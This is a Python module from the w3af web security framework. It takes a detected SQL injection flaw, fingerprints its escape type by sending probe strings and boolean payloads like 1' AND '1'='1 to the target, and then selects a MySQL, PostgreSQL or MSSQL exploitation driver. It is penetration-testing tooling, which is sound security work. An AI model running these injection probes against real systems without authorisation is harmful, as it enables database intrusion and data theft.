'''
dbDriverBuilder.py

Copyright 2006 Andres Riancho

This file is part of w3af, w3af.sourceforge.net .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''

import core.controllers.outputManager as om

from plugins.attack.db.mysqlmap import MySQLMap as mysqlmap
from plugins.attack.db.postgresqlmap import PostgreSQLMap as postgresqlmap
from plugins.attack.db.mssqlservermap import MSSQLServerMap as mssqlservermap
#from plugins.attack.db.mysqlmap import db2 as db2

from core.controllers.w3afException import w3afException

class dbDriverBuilder:
    '''
    This class is a builder for database drivers.
    
    @author: Andres Riancho ( andres.riancho@gmail.com )
    '''
    def __init__( self , urlOpener, cmpFunction ):
        '''
        cmpFunction is the function to be used to compare two strings.
        '''
        self._urlOpener = urlOpener
        self._cmpFunction = cmpFunction
    
    def _getType( self, vuln ):
        '''
        Determine how to escape the sql injection
        '''
        exploitDc = vuln.getDc()
        exploitDc[ vuln.getVar() ] = "'z'z'z'"
        functionReference = getattr( self._urlOpener , vuln.getMethod() )
        errorResponse = functionReference( vuln.getURL(), str(exploitDc) )

        for escape, type in [ ('\'','stringsingle') , ('"','stringdouble'), (' ','numeric')]:
            exploitDc[ vuln.getVar() ] = '1' + escape + ' AND ' + escape + '1' + escape + '=' + escape + '1'
            response = functionReference( vuln.getURL(), str(exploitDc) )
            if response.getBody() != errorResponse.getBody():
                vuln['type'] = type
                om.out.debug('[INFO] The injection type is: ' + type )
                return vuln
                
        om.out.error('Could not find SQL injection type.')
        return None
                
    def getDriverForVuln( self, vuln ):
        '''
        @return: A database driver for the vuln passed as parameter.
        '''
        if 'type' not in vuln:
            vuln = self._getType( vuln )
            if vuln is None:
                return None
        
        driverList = []
        driverList.append( mysqlmap( self._urlOpener, self._cmpFunction, vuln ) )
        driverList.append( postgresqlmap( self._urlOpener, self._cmpFunction, vuln ) )
        driverList.append( mssqlservermap( self._urlOpener, self._cmpFunction,  vuln ) )
        #driverList.append( db2( self._urlOpener, vuln ) )

        for driver in driverList:
            if driver.checkDbms():
                return driver
    
        return None
